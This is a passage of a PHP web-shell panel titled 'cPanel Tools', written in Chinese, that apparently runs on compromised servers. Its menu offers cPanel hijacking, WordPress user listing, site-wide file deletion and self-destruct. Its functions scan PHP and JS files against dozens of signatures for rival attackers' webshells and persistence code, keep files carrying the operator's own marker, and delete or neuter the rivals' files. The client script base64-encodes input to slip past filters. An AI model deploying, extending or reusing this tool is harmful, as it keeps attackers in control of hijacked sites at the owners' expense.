.field-title{margin:27px 0 20px;border-width:0;border-top-width:1px;}
.table{border-collapse:collapse;border-spacing:0;overflow:scroll;width:100%;}
.table td{word-break:break-all;max-width:300px;background-color:#FFF;}
.table th, .table td{border: 1px solid #ddd;padding:8px;}
.table tbody > tr:hover{background-color:#ccffcc;}
.table tbody > tr:hover td{background:none;}
.form-item{margin-bottom:15px;clear:both;border:1px solid #eee;}
.form-label{position:relative;float:left;display:block;padding:9px 15px;width:80px;font-weight:400;line-height:20px;text-align:right;background-color:#fafafa;}
.form-text .form-label{float: none;width: 100%;border-radius: 2px;box-sizing: border-box;text-align: left;}
.input-block{position:relative;margin-left:110px;min-height:36px;}
.form-text .input-block{margin: 0;left: 0;top: -1px;}
.form-input{display:block;padding-left:10px;width:50%;height:38px;line-height:1.3;line-height:38px\9;border:none;}
.form-text .form-textarea{position:relative;width: 90%;min-height: 100px;height:auto;line-height:20px;border-radius: 0 0 2px 2px;padding: 6px 10px;resize: vertical;border: none;}
.form-radio{margin:12px 0 0 12px;}
.tab{display:none}
</style>
<script type="text/javascript">
function sa(form){for(var i=0;i<form.elements.length;i++){var e=form.elements[i];if(e.type == 'checkbox'){if(e.name != 'chkall'){e.checked = form.chkall.checked;}}}}
function del(){if(confirm("Are you sure?")){return true;}else{return false;}}
function tab(x){for(var i=1;i<3;i++){document.getElementById("tab_"+i).style.display='none';if(i==x){document.getElementById("tab_"+i).style.display='block';}}}
function checkForm(){var controls = document.getElementsByTagName('input');for(var i=0; i<controls.length; i++){if(controls[i].type == 'text'){controls[i].value = controls[i].value.replace(/\./g, "<?php echo $dian;?>");}}var str = window.btoa(unescape(encodeURIComponent(document.getElementById('text-index').value)));document.getElementById('text-index').value = str;
return false;}
</script>
</head>
<body>
<nav id="sidebarMenu">
    <a href="#" id="logo"><span><i class="fa fa-drupal"></i>cPanel Tools</span></a>
    <ul class="nav">
        <li class="nav-item">
            <span><i class="fa fa-optin-monster"></i>cPanel 专栏</span>
            <ul class="nav-toggle">
                <li><a href="?action=cpanel" class="nav-link<?php if($action == 'cpanel' || $action == '') echo ' active';?>">cPanel 劫持</a></li>
            </ul>
        </li>
        <li class="nav-item">
            <span><i class="fa fa-search"></i>击杀敌方输出</span>
            <ul class="nav-toggle">
                <li><a href="?action=anti-virus" class="nav-link<?php if($action == 'anti-virus') echo ' active';?>">查杀大码</a></li>
                <li><a href="?action=trigger" class="nav-link<?php if($action == 'trigger') echo ' active';?>">查找触发式还原码</a></li>
                <li><a href="?action=list" class="nav-link<?php if($action == 'list') echo ' active';?>">文件列表</a></li>
                <li><a href="?action=delAll" class="nav-link<?php if($action == 'delAll') echo ' active';?>">全站删除特定文件</a></li>
            </ul>
        </li>
        <li class="nav-item">
            <span><i class="fa fa-wordpress"></i>Wordpress</span>
            <ul class="nav-toggle">
                <li><a href="?action=wp-user" class="nav-link<?php if($action == 'wp-user') echo ' active';?>">用户列表</a></li>
            </ul>
        </li>
        <li class="nav-item"><span><i class="fa fa-trash-o"></i><a href="?action=unlink">自毁程序</a></span></li>
    </ul>
</nav>
<main>
    <div class="container">
        <fieldset class="field-title">
            <legend><?php echo $title;?></legend>
        </fieldset>
        <?php echo $content;?>
    </div>
</main>
</body>
</html>
<?php
function is_wp($path){
    $i = 0;
    $file = array('wp-config.php','wp-login.php','wp-includes/version.php','wp-content/index.php','wp-admin/admin.php');
    foreach($file as $v){
        if(file_exists($path.$v)){
            $i++;
        }
    }
    if($i==5){
        return 1;
    }else{
        return 0;
    }
}

function get($url){
    $result = '';
    if(ini_get('allow_url_fopen')){
        $result = file_get_contents($url);
    }else{
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $result = curl_exec($ch);
        curl_close($ch);
    }
    return $result;
}

function getTrigger($path, $sign, $auto){
    global $trigger;
    $temp = scandir($path);
    if($temp){
        foreach($temp as $v){
            $fullPath = $path.'/'.$v;
            $fullPath = str_replace('//', '/', $fullPath);
            if(is_dir($fullPath)){
                if($v == '.' || $v == '..'){
                    continue;
                }
                getTrigger($fullPath, $sign, $auto);
            }else{
                $x = '';
                if(strstr($v, ".")){
                    $x = explode(".", $v);
                    $x = $x[count($x) - 1];
                }
                if(strtolower($x) == 'php'){
                    $txt = file_get_contents($fullPath);
                    $status = 0;
                    if(strstr($txt, "file_exists") && strstr($txt, "file_put_contents") && strstr($txt, "chmod") && strstr($txt, "file_get_contents") && strstr($txt, "index.php") && strstr($txt, ".htaccess")){
                        $status = 1;
                        $type = '常规还原码';
                    }elseif(strstr($txt, "@include") && strstr($txt, "preg_match") && strstr($txt, "file_get_contents")){
                        $status = 1;
                        $type = '批量还原码';
                    }elseif(strstr($txt, "ckII")){
                        $status = 1;
                        $type = '同行';
                    }elseif(strstr($txt, "@include") && strstr($txt, "\x")){
                        $status = 1;
                        $type = '广告联盟';
                    }elseif(strstr($txt, $sign)){
                        $status = 1;
                        $type = '己方标记';
                    }

                    if($status == 1){
                        $trigger .= '<tr><td align="center"><input type="checkbox" name="files[]" value="'.$fullPath.'"></td><td><a href="?path='.escape($fullPath).'&action=edit" target="_blank">'.$fullPath.'</td><td align="center">'.substr(sprintf('%o', fileperms($fullPath)), -4).'</td><td align="center">'.date("Y-m-d H:i:s", filectime($fullPath)).'</td><td align="center">'.date("Y-m-d H:i:s", filemtime($fullPath)).'</td><td align="center">'.date("Y-m-d H:i:s", fileatime($fullPath)).'</td><td align="center">'.round(filesize($fullPath) / 1024, 2).' Kb</td><td align="center">'.$type.'</td></tr>';
                        if($auto == 1 && !strstr($txt, $sign)){
                            $txt = str_replace('file_put_contents', '//file_put_contents', $txt);
                            $txt = str_replace('fwrite', '//fwrite', $txt);
                            file_put_contents($fullPath, $txt);
                        }
                    }
                }
            }
        }
    }
}

function hardScandir($dir){
    if(function_exists("scandir")){
        return scandir($dir);
    }else{
        $dh = opendir($dir);
        while(false !== ($filename = readdir($dh)))
            $files[] = $filename;
        return $files;
    }
}

function escape($uri){
    global $dian;
    $result = str_replace('%2F', '/', rawurlencode($uri));
    $result = str_replace('.', $dian, $result);
    return $result;
}

function checkSize($fileSize, $checkSize){
    $status = false;
    if(abs($fileSize - $checkSize) < 250){
        $status = true;
    }
    return $status;
}

function getHijackNum($link){
    $z = 0;
    $x = explode('_', $link);
    if(isset($x[1])){
        $y = explode('/', $x[1]);
        if(isset($y[0])){
            $z = $y[0] % 10;
        }
    }
    return $z;
}

function getDelAll($path, $md5, $auto){
    global $shell;
    $temp = scandir($path);
    if($temp){
        foreach($temp as $v){
            $fullPath = $path.'/'.$v;
            $fullPath = str_replace('//', '/', $fullPath);
            if(is_dir($fullPath)){
                if($v == '.' || $v == '..'){
                    continue;
                }
                getDelAll($fullPath, $md5, $auto);
            }else{
                $size = round(filesize($fullPath) / 1024, 2);
                if($size < 1024){
                    $temp = md5(file_get_contents($fullPath));
                    if($temp == $md5){
                        $shell .= '<tr><td align="center"><input type="checkbox" name="files[]" value="'.$fullPath.'"></td><td><a href="?path='.escape($fullPath).'&action=edit" target="_blank">'.$fullPath.'</td><td align="center">'.substr(sprintf('%o', fileperms($fullPath)), -4).'</td><td align="center">'.date("Y-m-d H:i:s", filectime($fullPath)).'</td><td align="center">'.date("Y-m-d H:i:s", filemtime($fullPath)).'</td><td align="center">'.date("Y-m-d H:i:s", fileatime($fullPath)).'</td><td align="center">'.round(filesize($fullPath) / 1024, 2).' Kb</td></tr>';
                        if($auto == 1){
                            unlink($fullPath);
                        }
                    }
                }
            }
        }
    }
}

function getShell($path, $sign, $auto){
    global $shell;
    $temp = scandir($path);
    if($temp){
        foreach($temp as $v){
            $fullPath = $path.'/'.$v;
            $fullPath = str_replace('//', '/', $fullPath);
            $x = explode(".", $v);
            $x = $x[count($x) - 1];
            if(is_dir($fullPath)){
                if($v == '.' || $v == '..'){
                    continue;
                }
                getShell($fullPath, $sign, $auto);
            }elseif(strtolower($x) == 'php' || strtolower($x) == 'js'){
                $txt = file_get_contents($fullPath);
                if($txt){
                    $txt = strtolower($txt);
                    $size = filesize($fullPath);
                    $status = 0;
                    if(strstr($txt, strtolower($sign))){
                        $status = 2;
                        $type = '己方标记';
                    }else{
                        if(strstr($txt, ';@$') && strstr($txt, ")].$") && strstr($txt, "(('')")){
                            $status = 1;
                            $type = '数组加密-1';
                        }elseif(strstr($txt, ']];$') && strstr($txt, "base64_decode") && strstr($txt, "mktime")){
                            $status = 1;
                            $type = '数组加密-2';
                        }elseif((strstr($txt, '_files') || strstr($txt, 'base64_decode')) && strstr($txt, '_get') && (strstr($txt, "error_reporting") || strstr($txt, "ignore_user_abort") || strstr($txt, "fm_convert_win")) && strstr($txt, 'set_time_limit') && !strstr($v, '.min.js') && !strstr($txt, 'updraftplus') && !strstr($txt, 'EASYPOPULATE_CONFIG')){
                            $status = 1;
                            $type = '未加密-1';
                        }elseif(strstr($txt, '$_post') && (strstr($txt, 'file_put_contents') || strstr($txt, "fopen")) && strstr($txt, 'error_') && strstr($txt, 'script') && strstr($txt, '_files') && (strstr($txt, 'opendir') || strstr($txt, 'scandir')) && strstr($txt, 'chmod')  && strstr($txt, 'filesize') && strstr($txt, 'ini_') && strstr($txt, 'exec(')){
                            $status = 1;
                            $type = '未加密-2';
                        }elseif(strstr($txt, 'php_uname') && strstr($txt, "mail(") && strstr($txt, "json_encode") && strstr($txt, '$_get') && strstr($txt, 'curl_exec')){
                            $status = 1;
                            $type = '邮件型';
                        }elseif(strstr($txt, "eval('?>'.$") && !strstr($txt, 'mustache')){
                            $status = 1;
                            $type = 'eval';
                        }elseif(strstr($txt, 'eval(') && (strstr($txt, "base64_decode(") || strstr($txt, '\x6') || strstr($txt, 'openssl_decrypt'))){
                            $status = 1;
                            $type = 'eval+base64';
                        }elseif(strstr($txt, 'multipart') && strstr($txt, 'type="file"') && (strstr($txt, 'if(@copy') || strstr($txt, '@fopen'))){
                            $status = 1;
                            $type = '上传大码-1';
                        }elseif((strstr($txt, 'base64_decode') || strstr($txt, '@shmop_open')) && strstr($txt, '$_files') && strstr($txt, '@copy') && !strstr($txt, 'wp_handle_upload_error')){
                            $status = 1;
                            $type = '上传大码-2';
                        }elseif(strstr($txt, 'goto') && strstr($txt, ": function") && strstr($txt, ": eval(")){
                            $status = 1;
                            $type = 'goto';
                        }elseif(strstr($txt,'null;@eval(') && strstr($txt,'};$')){
                            $status = 1;
                            $type = '01';
                        }elseif(strstr($txt, 'get_str') && strstr($txt, 'str_rot13') && strstr($txt, '@eval(')){
                            $status = 1;
                            $type = '02';
                        }elseif(strstr($txt, 'ignore_user_abort') && strstr($txt, "@include(pack(")){
                            $status = 1;
                            $type = '03';
                        }elseif(strstr($txt, 'base64_decode') && strstr($txt, "@chmod") && strstr($txt, '=="') && !strstr($txt, 'cpa_ind5.php')){
                            $status = 1;
                            $type = '04';
                        }elseif(strstr($txt, 'gzuncompress(strrev(') && strstr($txt, "create_function") && checkSize($size, 22534)){
                            $status = 1;
                            $type = '05';
                        }elseif(strstr($txt, 'cdn.jsdelivr.net') && strstr($txt, "sweetalert.min.js") && checkSize($size, 13695)){
                            $status = 1;
                            $type = '06';
                        }elseif(strstr($txt, ')return') && strstr($txt, "}else{function")){
                            $status = 1;
                            $type = '07';
                        }elseif(strstr($txt, 'class_uc_key') && strstr($txt, "hexdec") && checkSize($size, 60048)){
                            $status = 1;
                            $type = '08';
                        }elseif(strstr($txt, 'require(@$') && strstr($txt, "error_reporting(0);") && strstr($txt, "set_time_limit(0);")){
                            $status = 1;
                            $type = '09';
                        }elseif(strstr($txt, '$_post') && strstr($txt, '$_cookie') && strstr($txt, 'md5(') && strstr($txt, '@setcookie') && strstr($txt, 'create_function')){
                            $status = 1;
                            $type = '10';
                        }elseif(strstr($txt, ';@include(') && strstr($txt, '$_post') && strstr($txt, '$_cookie') && strstr($txt, 'return @$')){
                            $status = 1;
                            $type = '11';
                        }elseif(strstr($txt, "getcwd") && strstr($txt, 'file_exists') && strstr($txt, '@chdir') && strstr($txt, '@scandir')){
                            $status = 1;
                            $type = '12';
                        }elseif(strstr($txt, '.chr(') && strstr($txt, "@include(") && strstr($txt, "chr(ord($")){
                            $status = 1;
                            $type = '13';
                        }elseif(strstr($txt, 'register_key') && strstr($txt, "kaylin") &&  checkSize($size, 86523)){
                            $status = 1;
                            $type = '14';
                        }elseif((strstr($txt, "base64_decode") || strstr($txt, 'error_reporting')) && strstr($txt, '"display_errors"') && strstr($txt, 'function_exists')){
                            $status = 1;
                            $type = '15';
                        }elseif(strstr($txt, "base64_decode") && strstr($txt, 'fwrite') && strstr($txt, '.php?pass=')){
                            $status = 1;
                            $type = '16';
                        }elseif(strstr($txt, '$_server["\x') && strstr($txt, "serialize")){
                            $status = 1;
                            $type = '17';
                        }elseif(strstr($txt, 'parse_str') && strstr($txt, "<?=") && !strstr($txt, 'highlighter')){
                            $status = 1;
                            $type = '18';
                        }elseif(strstr($txt, 'eval(') && strstr($txt, "foxauto")){
                            $status = 1;
                            $type = '19';
                        }elseif(strstr($txt, 'eval(') && strstr($txt, 'rawurldecode(') && strstr($txt, 'function%20')){
                            $status = 1;
                            $type = '20';
                        }elseif(strstr($txt, '$g($b($c))') && strstr($txt, "_dec") && checkSize($size, 7563)){
                            $status = 1;
                            $type = '21';
                        }elseif(strstr($txt, '$_post[') && strstr($txt, "eval(") && strstr($txt, ";@$") && checkSize($size, 453)){
                            $status = 1;
                            $type = '22';
                        }elseif(strstr($txt, 'filemtime') && strstr($txt, "preg_match('#<") && checkSize($size, 21596)){
                            $status = 1;
                            $type = '23';
                        }elseif(strstr($txt, 'parse_str') && strstr($txt, "eval") && strstr($txt, "'1=%'")){
                            $status = 1;
                            $type = '24';
                        }elseif(strstr($txt, 'php_uname') && strstr($txt, "move_uploaded_file") && checkSize($size, 1133)){
                            $status = 1;
                            $type = '25';
                        }elseif(strstr($txt, 'dehex(') && strstr($txt, "/etc/named.conf") && strstr($txt, '$_files["uploadfile"]')){
                            $status = 1;
                            $type = '26';
                        }elseif(strstr($txt, '?><?php') && strstr($txt, ");$") && strstr($txt, "'}'")){
                            $status = 1;
                            $type = '27';
                        }elseif(strstr($txt, 'function_exists') && strstr($txt, ");@$") && strstr($txt, '.="\x')){
                            $status = 1;
                            $type = '28';
                        }elseif(strstr($txt, '"\1') && strstr($txt, "gettype") && (strstr($txt, ";@$") || strstr($txt, "count"))){
                            $status = 1;
                            $type = '29';
                        }elseif(strstr($txt, "return ''.$") && strstr($txt, '},$') && strstr($txt, '});$')){
                            $status = 1;
                            $type = '30';
                        }elseif(strstr($txt, '"\r\n"') && strstr($txt, '= @$') && strstr($txt, 'new ') && strstr($txt, 'chr($')){
                            $status = 1;
                            $type = '31';
                        }elseif(strstr($txt, 'index.php') && strstr($txt, '@file_put_contents') && strstr($txt, 'xiaoxiannv')){
                            $status = 1;
                            $type = 'xiaoxiannv';
                        }
                    }
                    if($status > 0){
                        $shell .= '<tr><td align="center"><input type="checkbox" name="files[]" value="'.$fullPath.'"></td><td><a href="?path='.escape($fullPath).'&action=edit" target="_blank">'.$fullPath.'</td><td align="center">'.substr(sprintf('%o', fileperms($fullPath)), -4).'</td><td align="center">'.date("Y-m-d H:i:s", filectime($fullPath)).'</td><td align="center">'.date("Y-m-d H:i:s", filemtime($fullPath)).'</td><td align="center">'.date("Y-m-d H:i:s", fileatime($fullPath)).'</td><td align="center">'.round(filesize($fullPath) / 1024, 2).' Kb</td><td align="center">'.$type.'</td></tr>';
                        if($auto == 1 && $status == 1){
                            unlink($fullPath);
                        }
                    }
                }else{
                    // can not read file
                }
            }
        }
    }    
}
?>